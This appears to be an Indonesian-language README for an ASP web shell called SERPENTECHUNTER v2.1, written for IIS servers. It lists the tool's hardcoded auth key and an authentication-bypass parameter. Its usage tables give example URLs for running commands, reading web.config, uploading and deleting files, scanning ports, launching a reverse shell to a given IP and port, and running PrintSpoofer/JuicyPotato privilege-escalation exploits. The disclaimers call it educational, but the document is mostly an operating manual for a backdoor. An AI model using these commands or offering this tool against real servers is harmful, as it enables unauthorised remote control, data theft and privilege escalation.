# SERPENTECHUNTER v2.1 – ASP WebShell

**Developer**   : SerpentSecHunter  
**Rilis**       : 02-07-2026  
**Versi**       : 2.1  
**Bahasa**      : VBScript (ASP)

---

## 📌 Deskripsi

SERPENTECHUNTER adalah sebuah **web shell** berbasis ASP (Active Server Pages) yang dirancang untuk membantu administrator server atau tim penguji penetrasi dalam mengelola dan memonitor server IIS.  
Alat ini menyediakan antarmuka web untuk menjalankan perintah, mengelola file, melakukan port scanning, hingga uji coba eksploitasi privilege escalation.

> **Catatan:** Penggunaan di luar lingkungan yang sah dan tanpa izin adalah **melanggar hukum**. Gunakan hanya untuk keperluan yang dibenarkan.

---

## ✨ Fitur

- **Autentikasi** – Cookie-based, parameter GET, IP whitelist, dan opsi bypass darurat.
- **Eksekusi Perintah** – Mendukung 3 metode fallback: `WScript.Shell`, `Shell.Application`, dan `WMI`.
- **Manajemen File** – Navigasi, upload, download, edit, view, rename, delete, copy, move, serta aksi massal (delete/rename/copy/move).
- **Pencarian File** – Cari file berdasarkan pola nama (case-insensitive).
- **Kompresi & Ekstraksi** – Zip dan unzip folder menggunakan `Shell.Application` (dengan fallback ke 7-Zip dan PowerShell jika tersedia).
- **Unduh dari URL** – Download file dari internet langsung ke server.
- **Port Scanner** – Scan port TCP (single port atau rentang, misal `80,443,8080-8090`).
- **Reverse Shell** – Menjalankan payload PowerShell di background (dapat ditambahkan Netcat/Telnet).
- **Exploit Engine** – Deteksi privilege `SeImpersonatePrivilege` dan jalankan PrintSpoofer / JuicyPotato untuk privilege escalation.
- **Koneksi Database** – Uji koneksi ke MSSQL atau Access.

---

## 🧩 Fungsi & Penggunaan

### Akses & Autentikasi

| Metode | Contoh |
|--------|--------|
| Login dengan auth key | `shell.asp?auth=SERPENTECHUNTER666` |
| Bypass total (darurat) | `shell.asp?bypass_ip=1` |
| Cookie (setelah login) | Otomatis berlaku 1 tahun |

### Parameter Aksi (action)

| Aksi | Contoh URL |
|------|------------|
| Navigasi direktori | `?dir=C:\inetpub\wwwroot` |
| Eksekusi perintah | `?action=exec&cmd=whoami` |
| Upload file | (POST multipart) |
| Download file | `?action=download&file=config.asp` |
| Edit file | `?action=edit&file=index.asp` |
| View file | `?action=view&file=web.config` |
| Hapus file/folder | `?action=delete&file=test.txt` |
| Rename | `?action=rename&old=old.txt&new=new.txt` |
| Copy | `?action=copy&src=src.txt&dst=dst.txt` |
| Zip folder | `?action=zip&folder=data&zipname=backup` |
| Unzip | `?action=unzip&file=backup.zip&dest=extract` |
| Reverse shell | `?action=reverse&ip=192.168.1.10&port=4444` |
| Port scan | `?action=portscan&host=192.168.1.1&ports=80,443,22-25` |
| Cek kerentanan | `?action=exploit_check` |
| Jalankan exploit | `?action=exploit_run&type=printspoofer` |

> **Catatan:** Untuk aksi massal (delete/rename/copy/move), gunakan metode POST dengan field `files` (checkbox) dan `new_names` (untuk rename).

---

## 📈 Kelebihan

- **Mudah digunakan** – Antarmuka web yang intuitif.
- **Fallback eksekusi** – Jika satu metode gagal, metode lain dicoba secara otomatis.
- **Fitur lengkap** – Mencakup hampir semua kebutuhan administrasi jarak jauh.
- **Bypass sederhana** – Opsi `?bypass_ip=1` untuk situasi darurat.
- **Bebas dependensi** – Menggunakan komponen bawaan Windows (WScript, Shell, WMI).

---

## ⚠️ Kekurangan & Keterbatasan

- **Kinerja** – Eksekusi perintah melalui `Shell.Application` dan `WMI` bisa lambat pada server dengan spesifikasi rendah.
- **Kompatibilitas** – Tidak semua fungsi berjalan di semua versi IIS/Windows (misal, `Compress-Archive` hanya ada di Windows 10/Server 2016+).
- **Upload** – Metode parsing multipart bawaan rentan terhadap error pada file besar atau nama file dengan karakter khusus.
- **Mass Action** – Fitur massal (delete, rename, dll.) bekerja dengan mengirimkan daftar file sebagai string yang dipisahkan koma; bisa gagal jika nama file mengandung koma.
- **Keamanan** – Opsi `?bypass_ip=1` sangat berbahaya jika diekspos ke publik. Gunakan hanya di lingkungan terkontrol.
- **Masih dalam pengembangan** – Beberapa fitur mungkin belum stabil. Uji coba di lingkungan non-produksi terlebih dahulu.

---

## 📄 Hak Cipta & Lisensi

**SERPENTECHUNTER v2.1** dikembangkan oleh **SerpentSecHunter** dan didistribusikan untuk keperluan **edukasi dan pengujian keamanan**.

- **Penulis Kode**: SerpentSecHunter
- **Kontributor**: ZAMZZZ (perbaikan dan penyesuaian)
- **Lisensi**: **Gunakan dengan risiko sendiri**. Tidak ada jaminan, baik tersurat maupun tersirat. Pengguna bertanggung jawab penuh atas konsekuensi penggunaan.
- **Dilarang** menggunakan alat ini untuk aktivitas ilegal.

Dengan menggunakan alat ini, Anda menyetujui bahwa pengembang tidak bertanggung jawab atas segala penyalahgunaan atau kerusakan yang timbul.

---

> *"Dibuat untuk belajar, bukan untuk merusak. Gunakan dengan bijak."* 🙏
